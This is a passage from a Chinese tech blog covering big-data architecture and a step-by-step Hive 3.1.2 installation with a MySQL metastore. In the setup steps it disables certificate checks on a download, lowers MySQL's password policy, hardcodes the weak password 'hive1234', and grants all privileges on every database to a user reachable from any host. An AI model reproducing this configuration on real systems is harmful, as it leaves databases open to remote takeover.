<li><p>服务器的本地日志在写入的同时，还会通过Flume等工具进行持续收集，并推送到 Kafka集群中指定的主题。在收集、推送的过程中，会进行一些日志数据处理工作，如请求头信息解析、接口参数提取和日志信息格式化等。</p>
</li>
<li><p>我们可以使用SparkStreaming实时消费处理Kafka消息，并将处理好的数据写入指定的数据库中，如MySQL、Redis等。此种方式可以提供实时的服务端日志应用，如错误日志监控报警等。对于Spark Streaming处理完的数据，将继续推送到Kafka，供其他业务</p>
</li>
<li><p>我们也可以使用flume消费kafka的消息，并将处理号的数据写入HDFS，为后续的离线使用提供基础数据</p>
<p><img src="/aposts/f5236b59/image-20211229151331689.png" alt="image-20211229151331689"></p>
</li>
</ul>
<h3 id="客户端日志采集"><a href="#客户端日志采集" class="headerlink" title="客户端日志采集"></a>客户端日志采集</h3><h4 id="移动端分类"><a href="#移动端分类" class="headerlink" title="移动端分类"></a>移动端分类</h4><p>移动端分为两种：</p>
<ul>
<li>Native App：原生应用程序。也就是基于智能手机系统的原生程式编写运行的应用程序，比如Android，IOS等</li>
<li>Hybrid App：混合应用程序。原生应用程序嵌入h5的方式</li>
</ul>
<h4 id="采集方式"><a href="#采集方式" class="headerlink" title="采集方式"></a>采集方式</h4><ul>
<li>浏览器页面的日志采集。如采集Hybrid App中h5浏览器<ul>
<li>浏览量PV</li>
<li>访问量UV</li>
</ul>
</li>
<li>移动端客户端日志的采集。如采集Native App<ul>
<li>埋点SDK</li>
</ul>
</li>
</ul>
<h2 id="数据同步"><a href="#数据同步" class="headerlink" title="数据同步"></a>数据同步</h2><ul>
<li>数据仓库的特性之一是集成，即首先把未经过加工处理的、不同来源的、不同形式的数据同步到ODS层，一般情况下，这些ODS层数据包括日志数据和业务DB数据。对于业务DB数据而言(比如存储在MySQL中)，将数据采集并导入到数仓中(通常是Hive或者MaxCompute)是非常重要的一个环节。</li>
<li>针对不同数据类型和业务场景，我们可以选择不同的数据同步方式：<ul>
<li>直连同步</li>
<li>数据文件同步</li>
<li>数据库日志解析同步</li>
</ul>
</li>
</ul>
<h3 id="直连同步"><a href="#直连同步" class="headerlink" title="直连同步"></a>直连同步</h3><ul>
<li>直连同步是指通过定义好的规范接口API和基于动态链接库的方式直接连接业务库</li>
<li>直连同步的方式配置十分简单，很容易上手操作，比较适合操作型业务系统的数据同步，但是会存在随着业务规模的增长，<strong>数据同步花费的时间会越来越长、连数据库查询数据，对数据库影响非常大，容易造成慢查询，可能会影响业务线上的正常服务</strong></li>
</ul>
<p><img src="/aposts/f5236b59/image-20211229155528410.png" alt="image-20211229155528410"></p>
<ul>
<li><a href="https://moon-full.gitee.io/2021/12/14/%E7%AC%AC%E4%BA%94%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93%E5%AE%9E%E4%BE%8B/">第五章 数据仓库实例</a>，就是采用这种方式</li>
</ul>
<h3 id="数据文件同步"><a href="#数据文件同步" class="headerlink" title="数据文件同步"></a>数据文件同步</h3><ul>
<li>对文件进行格式约定，直接从源系统生成数据（mysql，oracle，DB2等）的文件，通过FTP服务器传输到目标系统，最终加载到目标系统中。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211229155932718.png" alt="image-20211229155932718"></p>
<ul>
<li>通过文件服务进行上传、下载，可能出现丢包或出现错误。可以加一些校验机制</li>
</ul>
<h3 id="数据库日志解析同步"><a href="#数据库日志解析同步" class="headerlink" title="数据库日志解析同步"></a>数据库日志解析同步</h3><ul>
<li>数据库日志解析的同步方式可以实现实时与准实时的同步，延迟可以控制在毫秒级别的，其最大的优势就是性能好、效率高，不会对源数据库造成影响，目前，从业务系统到数据仓库中的实时增量同步，<strong>广泛采取这种方式</strong>。当然，这种方式也会存在一些问题，比如批量补数时造成大量数据更新，<strong>日志解析会处理较慢</strong>，造成数据延迟。除此之外，<strong>这种方式比较复杂</strong>，<strong>投入也较大</strong>，因为需要一个实时的抽取系统去抽取并解析日志</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211229160911594.png" alt="image-20211229160911594"></p>
<h2 id="大数据存储"><a href="#大数据存储" class="headerlink" title="大数据存储"></a>大数据存储</h2><p>对于大数据存储选项，需要从存储成本、数据规模、数据访问特性和查询性能等方面进行考虑，下图列举了不同场景大数据存储选型。</p>
<p><img src="/aposts/f5236b59/image-20211229161451827.png" alt="image-20211229161451827"></p>
<h2 id="大数据计算"><a href="#大数据计算" class="headerlink" title="大数据计算"></a>大数据计算</h2><ul>
<li>一般分为离线计算、批量计算、实时计算和流式计算，业界一般都使用<strong>离线计算和实时计算</strong>，下图是各个计算方式的区别</li>
</ul>
<h3 id="离线计算"><a href="#离线计算" class="headerlink" title="离线计算"></a>离线计算</h3><p><img src="/aposts/f5236b59/image-20211229164031999.png" alt="image-20211229164031999"></p>
<ul>
<li>离线计算使用的多数场景是周期（小时、天，月）性执行一个job任务，离线计算应用中常用的是离线ETL的处理。如MapReduce就是一个离线的计算框架，下图举例说明了离线计算工作流</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211229165345162.png" alt="image-20211229165345162"></p>
<ul>
<li>离线计算需要上下游各组件合作，一般会由多个任务单元构成（HiveQL，shell，Shell和MapReduce等），多个单元由很强的依赖关系</li>
</ul>
<h3 id="实时计算"><a href="#实时计算" class="headerlink" title="实时计算"></a>实时计算</h3><ul>
<li>对数据计算要求较高，如实时的ETL，实时监控等，延时一般为毫秒级别，目前笔比较流行的实时框架有<code>Spark Streaming</code>和<code>Flink</code></li>
<li>下图展示了一个大数据计算平台架构，其中包含离线计算和实时计算</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211229170148516.png" alt="image-20211229170148516"></p>
<h2 id="大数据监控"><a href="#大数据监控" class="headerlink" title="大数据监控"></a>大数据监控</h2><p>在大数据进行采集、存储和处理后，下面就是项目的上线和日常运行。在运行过程中监控和报警就非常重要</p>
<h3 id="数据监控"><a href="#数据监控" class="headerlink" title="数据监控"></a>数据监控</h3><p>一些常见的监控内容：</p>
<ul>
<li>以时间维度对数据记录进行监控。比如某个时间段出现明显波动</li>
<li>对数据的NULL和0值进行监控</li>
<li>对数据的值域进行监控。如对数据中某字段出现合理域值以外的值</li>
<li>对数据的重复度进行监控。如电商业务的交易记录出现重复等</li>
</ul>
<h3 id="运维监控"><a href="#运维监控" class="headerlink" title="运维监控"></a>运维监控</h3><ul>
<li>在当前大数据项目中，使用服务器集群方式支撑业务已经成为常态，开发自动化运维监控系统非常重要。</li>
<li>监控常见的cpu，men，io，tps，对大数据生态系统进行监控，如zookeeper节点可用性，yarn资源空闲情况、kafka消息堆积情况，以及spark job完成进度等</li>
<li>其他的一些监控，如端口,nginx的延迟</li>
</ul>
<h2 id="大数据项目开发案例"><a href="#大数据项目开发案例" class="headerlink" title="大数据项目开发案例"></a>大数据项目开发案例</h2><ul>
<li>数据分析平台是一类重要的大数据应用,广泛应用于互联网金融、银行、电子商务和在线教育等领域。</li>
<li>数据分析平台通常需要实时计算、查询并借助可视化平台展示数据。通过数据分析平台,用户可以更加直观、高效和全面地了解数据分布情况,观察数据变化趋势,最终达到数据驱动业务决策的目标。</li>
<li>与单纯的数据可视化类平台或BI报表相比,数据分析平台的链路更长,除最终的可视化数据展示以外,还包括源头的数据采集;<strong>而BI报表通常只是对数据的汇总和查询展示,不涉及数据采集、数据存储等环节</strong>。如图4-15所示,根据不同的数据分析类型,数据分析平台可分为如下几类:**用户行为类(应用比较多)**、App分析类、应用市场监控类、流量分析类和广告效果监控类等。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211230104909426.png" alt="image-20211230104909426"></p>
<h3 id="项目背景介绍"><a href="#项目背景介绍" class="headerlink" title="项目背景介绍"></a>项目背景介绍</h3><ul>
<li>分析手机App用户数量和交易的某些行为习惯，实现精准营销。类似于购物推荐这种</li>
</ul>
<h3 id="项目需求分析"><a href="#项目需求分析" class="headerlink" title="项目需求分析"></a>项目需求分析</h3><ul>
<li>与传统应用开发相同,在迸行大数据项目开发前,首先要明确项目的需求。用户行为分析平台需要提供多种数据釆集方式,通过对埋点数据的采集、处理、建模和存储,进行深度分析和应用,帮助企业高效获取海量数据,并进行多维、实时和准确的数据分析,还原真实业务场。用户行为分析平台的业务流程包括数据釆集、数据处理、数据建模、数据存储、数据簑理、智能分析和基础看板。图4-16是用户行为分析平台的业务流程。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211230110240930.png" alt="image-20211230110240930"></p>
<ul>
<li>用户行为分析主要包括：<strong>基础看板和智能分析</strong></li>
<li>基础看板：如实时统计在线人数、启动次数</li>
<li>智能分析：如从商品浏览率到提交订单，支付订单，各个节点用户转化率</li>
</ul>
<h3 id="项目开发流程"><a href="#项目开发流程" class="headerlink" title="项目开发流程"></a>项目开发流程</h3><ul>
<li>大数据项目的完整流程如图4-18所示，在进行大数据项目开发时,首先,大数据开发工程师需要根据产品需求文档进行架构设<br>计、模型设计和调度设计,产出架构设计文档、ETL设计文档和调度设计文档;然后,项目<br>相关人员(包括测试人员)需要对这些设计进行评审等。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211230111333106.png" alt="image-20211230111333106"></p>
<ul>
<li>图4-19为大数据项目开发流程。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211230111422715.png" alt="image-20211230111422715"></p>
<h4 id="结构设计"><a href="#结构设计" class="headerlink" title="结构设计"></a>结构设计</h4><p>根据平台需求的特点,在架构设计时,将用户行为分析平台拆分为4个服务：</p>
<ul>
<li>数据采集与预处理服务( og service)</li>
<li>数据处理服务(实时数据处理服务(real-task)使用Flink,离线数据处理服务采用 Azkaban进行任务调度),</li>
<li>数据查询服务(DAS),</li>
<li>数据管理服务(DMS)</li>
</ul>
<p>如图4-20所示。数据从源数据到可视化展示需要从下至上经过这些服务的处理。</p>
<p><img src="/aposts/f5236b59/image-20211230112924605.png" alt="image-20211230112924605"></p>
<p>用户行为分析平台的核心是数据处理,即从数据采集到数据应用的数据流转,如图4-21</p>
<p><img src="/aposts/f5236b59/image-20211230113054864.png" alt="image-20211230113054864"></p>
<h4 id="模型设计"><a href="#模型设计" class="headerlink" title="模型设计"></a>模型设计</h4><p>根据用户行为分析平台的功能和特点,我们需要设计能够满足其应用需求的数据仓库架构。图4-24是一个数据仓库架构方案：</p>
<p><img src="/aposts/f5236b59/image-20211230114656565.png" alt="image-20211230114656565"></p>
<ul>
<li>RB层(实时层)KRB的全称是 Kudu ReaBase,该层的表全部为未统计汇总的实时明细数如 krb. trs_app_event_log表是埋点日志事件表</li>
<li>KRS层(实时汇总层)KRS的全称是Kucu Real Sum,该层的表全部为统计汇总的实时明细数据,如ks. rs app_user_open_dh表是App用活跃统计表(以小时为单位进行分区)表名的结尾后缀用于表明该表分区间单位，如本例中的<strong>dh表示小时进行分区</strong>。</li>
<li>HDB层(贴源层):HDB的全称是 Hive Data Base,该层的表全部为未统计汇总的离线明细数据。该层数据是通过mpaa从KRB层同步过来的,如 hdb db app_equ_install_info表是App安装设备信息表。</li>
<li>HDS层(汇总层):HDS的全称是 Hive Data stat,该层的表全部为统计汇总的离线数据明细</li>
<li>HTP层(中间层):HTP的全称是 Hive Temporary,该层的表全部为数据处理过程中生成的中间临时数据,如 htp. tmp skynet user_retention d表是日用户留存分析中间表（以天为单位进行分区）</li>
<li>IVW层(视图层):IVW的全称是 mpala View,该层的表全部为mpaa操作的视图表,如ⅳ w.trs <em>app_event log表是KRB层(实时层)中提到的 krs. trs app</em> event_log表的视图。</li>
</ul>
<p>在后续测试案例中,我们会使用实时层中的埋点日志事件表 krb. trs_ app_event_loc<br>这里只举例说明该表的结构设计。表4-7汇总了(贴出部分)</p>
<ul>
<li>以log_i作为主键。</li>
<li>以log_id作为hash分区,以log_dt作为rang分区</li>
<li>历史数据分区和最新数据分区一直保留</li>
<li><strong>只新增数据,增量分区,使用 Flink SQL写数据</strong></li>
</ul>
<p><img src="/aposts/f5236b59/image-20211230115834627.png" alt="image-20211230115834627"></p>
<h4 id="调度设计"><a href="#调度设计" class="headerlink" title="调度设计"></a>调度设计</h4><ul>
<li>上面列出的HDS层数据表位于用户行为分析平台的离线数据存储层。对于离线数据理,具有周期性、重复性的特点,因此,我们使用调度工具 <strong>Azkaban</strong>提供的可靠计划来处理数据。根据各数据表中数据的前后依赖关系,用户行为分析平台的调度设计如图4-25际示。由图4-25可知,为了提高项目的可读性,子任务节点的命名与表名保持形式上的统一(子任务节点生成与之名称对应的数据表中的数据)。</li>
</ul>
<p><img src="/aposts/f5236b59/image-20211230151251867.png" alt="image-20211230151251867"></p>
<ul>
<li>在完成用户行为分析平台的架构设计、模型设计和调度设计后，开发人员便可以根据它们进行相应的代码开发。通过对用户行为分析平台项目的介绍，我们不难发现，项目中需要开发的功能多、业务流程复杂，需要测试人员的参与来保证平台质量。、</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>第四章 大数据之hive搭建</title>
    <url>/aposts/ae85ee2e/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>学习本教程，请先看完<a href="https://moon-full.gitee.io/2021/12/07/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E5%A4%A7%E6%95%B0%E6%8D%AE%E4%B9%8BHadoop%E6%90%AD%E5%BB%BA/">第三章 大数据之Hadoop搭建</a></li>
<li>本次教程主要来自<a href="http://dblab.xmu.edu.cn/blog/1080-2/">基于Hadoop的数据仓库Hive 学习指南</a>，本次的内容全部经过了自己的实践，与参考文档中不一致的地方，也是经过查询各种资料和实践通过</li>
</ul>
<h2 id="hive简单介绍"><a href="#hive简单介绍" class="headerlink" title="hive简单介绍"></a>hive简单介绍</h2><p>使用 hive 的命令行接口，感觉很像操作关系数据库，但是 hive 和关系数据库还是有很大的不同，下面我就比较下 hive 与关系数据库的区别，具体如下：</p>
<ul>
<li>Hive 和关系数据库存储文件的系统不同，Hive 使用的是 hadoop 的 HDFS（hadoop 的分布式文件系统），关系数据库则是服务器本地的文件系统；</li>
<li>hive 使用的计算模型是 mapreduce，而关系数据库则是自己设计的计算模型；</li>
<li>关系数据库都是为实时查询的业务进行设计的，而 Hive 则是为海量数据做数据挖掘设计的，实时性很差；实时性的区别导致 Hive 的应用场景和关系数据库有很大的不同；</li>
</ul>
<h2 id="安装hive"><a href="#安装hive" class="headerlink" title="安装hive"></a>安装hive</h2><ul>
<li>下载版本选择为3.1.2</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos <span class="built_in">local</span>]<span class="comment"># wget --no-check-certificate  https://dlcdn.apache.org/hive/hive-3.1.2/apache-hive-3.1.2-bin.tar.gz</span></span><br><span class="line"></span><br><span class="line">sudo tar -zxvf ./apache-hive-3.1.2-bin.tar.gz -C /usr/local   <span class="comment"># 解压到/usr/local中</span></span><br><span class="line"><span class="built_in">cd</span> /usr/local/</span><br><span class="line">sudo <span class="built_in">mv</span> apache-hive-3.1.2-bin hive       <span class="comment"># 将文件夹名改为hive</span></span><br><span class="line">sudo <span class="built_in">chown</span> -R hadoop:hadoop hive   <span class="comment"># 修改文件权限</span></span><br></pre></td></tr></table></figure>

<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos local]$ vi ~/.bashrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">export HIVE_HOME=/usr/local/hive</span><br><span class="line">export PATH=$PATH:$HIVE_HOME/bin</span><br><span class="line">export HADOOP_HOME=/usr/local/hadoop</span><br></pre></td></tr></table></figure>

<ul>
<li><p>生效环境变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>修改<code>/usr/local/hive/conf</code>下的hive-site.xml</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/hive/conf</span><br><span class="line"><span class="built_in">mv</span> hive-default.xml.template hive-default.xml</span><br><span class="line"></span><br><span class="line">[hadoop@VM-24-13-centos conf]$ vi hive-site.xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><br><span class="line">&lt;?xml-stylesheet <span class="built_in">type</span>=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;configuration.xsl&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;jdbc:mysql://localhost:3306/hive?createDatabaseIfNotExist=<span class="literal">true</span>&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;JDBC connect string <span class="keyword">for</span> a JDBC metastore&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;Driver class name <span class="keyword">for</span> a JDBC metastore&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hive&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;username to use against metastore database&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">    &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;hive1234&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;记得在创建用户时，密码要和这个对应&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="安装和配置mysql"><a href="#安装和配置mysql" class="headerlink" title="安装和配置mysql"></a>安装和配置mysql</h2><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><ul>
<li>我之前已经装好了，省略此步骤</li>
</ul>
<h3 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h3><ul>
<li>新建hive数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos conf]$ mysql -u root -p</span><br><span class="line">create database hive;  #这个hive数据库与hive-site.xml中localhost:3306/hive的hive对应，用来保存hive元数据</span><br></pre></td></tr></table></figure>

<ul>
<li>配置mysql允许hive接入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password.policy=<span class="string">&#x27;LOW&#x27;</span>; <span class="comment"># mysql8后，有密码策略要求，改为低</span></span><br><span class="line">mysql &gt;create user hive@localhost identified by <span class="string">&#x27;hive1234&#x27;</span>;</span><br><span class="line">					<span class="comment"># hive 代表你要创建的此数据库的新用户账号</span></span><br><span class="line">					<span class="comment"># localhost 代表访问本地权限，不可远程访问，还有其他值</span></span><br><span class="line">						<span class="comment"># %代表通配所有host地址权限(可远程访问)</span></span><br><span class="line">						<span class="comment"># 指定特殊Ip访问权限 如10.138.106.10</span></span><br><span class="line">                    <span class="comment"># hive1234代表你要创建的此数据库的新用密码</span></span><br><span class="line">mysql&gt;grant all privileges on  *.* to <span class="string">&#x27;hive&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="comment"># 授权数据库给hive用户</span></span><br><span class="line">mysql&gt; flush privileges;  <span class="comment">#刷新mysql系统权限关系表</span></span><br></pre></td></tr></table></figure>

<h2 id="配置hive"><a href="#配置hive" class="headerlink" title="配置hive"></a>配置hive</h2><h3 id="启动hive"><a href="#启动hive" class="headerlink" title="启动hive"></a>启动hive</h3><ul>
<li><p>启动hive之前，请先启动hadoop集群。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start-all.sh <span class="comment">#启动hadoop</span></span><br><span class="line">hive  <span class="comment">#启动hive</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hive&gt; show databases;<span class="comment"># 输入后报错</span></span><br><span class="line">FAILED: HiveException java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br></pre></td></tr></table></figure>

<ul>
<li>Hive现在包含一个用于 Hive Metastore 架构操控的脱机工具，名为 schematool.此工具可用于初始化当前 Hive 版本的 Metastore 架构。此外，其还可处理从较旧版本到新版本的架构升级，用下面的命令：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos conf]$ schematool -dbType mysql -initSchema</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出现下面的错误，提升驱动载入失败</span></span><br><span class="line">org.apache.hadoop.hive.metastore.HiveMetaException: Failed to load driver</span><br><span class="line">Underlying cause: java.lang.ClassNotFoundException : com.mysql.jdbc.Driver</span><br></pre></td></tr></table></figure>

<ul>
<li>打开<a href="https://downloads.mysql.com/archives/c-j/">mysql下载链接</a></li>
</ul>
<p><img src="/aposts/ae85ee2e/image-20211208112332826.png" alt="image-20211208112332826"></p>
<ul>
<li>下载安装mysql驱动</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget https://downloads.mysql.com/archives/get/p/3/file/mysql-connector-java-8.0.26-1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以看到其他都是文档，那么连接驱动文件是/usr/share/java/mysql-connector-java.jar</span></span><br><span class="line">[root@study1 opt]<span class="comment"># rpm -qpl mysql-connector-java-8.0.26-1.el7.noarch.rpm </span></span><br><span class="line">警告：mysql-connector-java-8.0.26-1.el7.noarch.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY</span><br><span class="line">/usr/share/doc/mysql-connector-java-8.0.26</span><br><span class="line">/usr/share/doc/mysql-connector-java-8.0.26/CHANGES</span><br><span class="line">/usr/share/doc/mysql-connector-java-8.0.26/INFO_BIN</span><br><span class="line">/usr/share/doc/mysql-connector-java-8.0.26/INFO_SRC</span><br><span class="line">/usr/share/doc/mysql-connector-java-8.0.26/LICENSE</span><br><span class="line">/usr/share/doc/mysql-connector-java-8.0.26/README</span><br><span class="line">/usr/share/java/mysql-connector-java.jar</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 安装，提示缺少依赖java-headless且版本要大于1.8版本</span></span><br><span class="line">[root@study1 opt]<span class="comment"># rpm -ivh mysql-connector-java-8.0.26-1.el7.noarch.rpm </span></span><br><span class="line">警告：mysql-connector-java-8.0.26-1.el7.noarch.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY</span><br><span class="line">错误：依赖检测失败：</span><br><span class="line">	java-headless &gt;= 1:1.8.0 被 mysql-connector-java-1:8.0.26-1.el7.noarch 需要</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">[root@study1 opt]<span class="comment"># yum -y install java-headless</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 再次安装</span></span><br><span class="line">[root@study1 opt]<span class="comment"># rpm -ivh mysql-connector-java-8.0.26-1.el7.noarch.rpm </span></span><br><span class="line">警告：mysql-connector-java-8.0.26-1.el7.noarch.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY</span><br><span class="line">准备中...                          <span class="comment">################################# [100%]</span></span><br><span class="line">正在升级/安装...</span><br><span class="line">   1:mysql-connector-java-1:8.0.26-1.e<span class="comment">################################# [100%]</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 查看驱动文件</span></span><br><span class="line">[root@study1 opt]<span class="comment"># ll /usr/share/java</span></span><br><span class="line">总用量 2328</span><br><span class="line">-rw-r--r--. 1 root root 2381198 9月  11 05:55 mysql-connector-java.jar</span><br><span class="line"><span class="comment"># 把驱动文件拷贝到hive的lib中</span></span><br><span class="line">[root@study1 opt]<span class="comment"># cp /usr/share/java/mysql-connector-java.jar /usr/local/hive/lib</span></span><br></pre></td></tr></table></figure>

<ul>
<li>再次schematool初始化就可以了</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos local]$ schematool -dbType mysql -initSchema</span><br></pre></td></tr></table></figure>

<ul>
<li>进入hive</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[hadoop@VM-24-13-centos <span class="built_in">local</span>]$ hive</span><br><span class="line"></span><br><span class="line">hive&gt; show databases;</span><br><span class="line">OK</span><br><span class="line">default</span><br><span class="line">Time taken: 0.02 seconds, Fetched: 1 row(s)</span><br><span class="line">hive&gt; show tables;</span><br><span class="line">OK</span><br><span class="line">Time taken: 0.036 seconds</span><br><span class="line">hive&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果要退出Hive交互式执行环境，可以输入如下命令：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hive&gt; <span class="built_in">exit</span>;</span><br><span class="line">[hadoop@VM-24-13-centos <span class="built_in">local</span>]$</span><br></pre></td></tr></table></figure>

<h2 id="Hive的常用HiveQL操作"><a href="#Hive的常用HiveQL操作" class="headerlink" title="Hive的常用HiveQL操作"></a>Hive的常用HiveQL操作</h2><h3 id="Hive基本数据类型"><a href="#Hive基本数据类型" class="headerlink" title="Hive基本数据类型"></a>Hive基本数据类型</h3><ul>
<li>Hive支持基本数据类型和复杂类型, 基本数据类型主要有数值类型(INT、FLOAT、DOUBLE ) 、布尔型和字符串, 复杂类型有三种:ARRAY、MAP 和 STRUCT。</li>
</ul>
<h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h4><ul>
<li>TINYINT: 1个字节</li>
<li>SMALLINT: 2个字节</li>
<li>INT: 4个字节</li>
<li>BIGINT: 8个字节</li>
<li>BOOLEAN: TRUE&#x2F;FALSE</li>
<li>FLOAT: 4个字节，单精度浮点型</li>
<li>DOUBLE: 8个字节，双精度浮点型STRING 字符串</li>
</ul>
<h4 id="复杂数据类型"><a href="#复杂数据类型" class="headerlink" title="复杂数据类型"></a>复杂数据类型</h4><ul>
<li>ARRAY: 有序字段</li>
<li>MAP: 无序字段</li>
<li>STRUCT: 一组命名的字段</li>
</ul>
<h3 id="用的HiveQL操作命令"><a href="#用的HiveQL操作命令" class="headerlink" title="用的HiveQL操作命令"></a>用的HiveQL操作命令</h3><ul>
<li><p>Hive常用的HiveQL操作命令主要包括：数据定义、数据操作。接下来详细介绍一下这些命令即用法（想要了解更多请参照《Hive编程指南》一书）</p>
</li>
<li><p>数据定义：主要用于创建修改和删除数据库、表、视图、函数和索引。</p>
</li>
</ul>
<h4 id="创建、修改和删除数据库"><a href="#创建、修改和删除数据库" class="headerlink" title="创建、修改和删除数据库"></a>创建、修改和删除数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database if not exists hive;       #创建数据库</span><br><span class="line">show databases;                           #查看Hive中包含数据库</span><br><span class="line">show databases like &#x27;h.*&#x27;;                #查看Hive中以h开头数据库</span><br><span class="line">use hive; # 使用数据库</span><br><span class="line">show tables; # 查看表列表</span><br><span class="line">drop table usr; #  删除表</span><br></pre></td></tr></table></figure>

<h4 id="创建、修改和删除表"><a href="#创建、修改和删除表" class="headerlink" title="创建、修改和删除表"></a>创建、修改和删除表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#创建内部表（管理表）</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> hive.usr(</span><br><span class="line">      name string comment <span class="string">&#x27;username&#x27;</span>, # name表示字段命，string表示字段类型，comment后面内容表示说明</span><br><span class="line">      pwd string comment <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">      address struct<span class="operator">&lt;</span>street:string,city:string,state:string,zip:<span class="type">int</span><span class="operator">&gt;</span> comment  <span class="string">&#x27;home address&#x27;</span>,</span><br><span class="line">      identify map<span class="operator">&lt;</span><span class="type">int</span>,tinyint<span class="operator">&gt;</span> comment <span class="string">&#x27;number,sex&#x27;</span>) comment <span class="string">&#x27;description of the table&#x27;</span>  </span><br><span class="line">     tblproperties(<span class="string">&#x27;creator&#x27;</span><span class="operator">=</span><span class="string">&#x27;me&#x27;</span>,<span class="string">&#x27;time&#x27;</span><span class="operator">=</span><span class="string">&#x27;2016.1.1&#x27;</span>); #tblproperties 设置表的属性 </span><br><span class="line">     </span><br><span class="line">#创建外部表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> usr2(</span><br><span class="line">      name string,</span><br><span class="line">      pwd string,</span><br><span class="line">  address struct<span class="operator">&lt;</span>street:string,city:string,state:string,zip:<span class="type">int</span><span class="operator">&gt;</span>,</span><br><span class="line">      identify map<span class="operator">&lt;</span><span class="type">int</span>,tinyint<span class="operator">&gt;</span>) </span><br><span class="line">      <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;,&#x27;</span> # 字段分隔符来进行分割，如：test1,<span 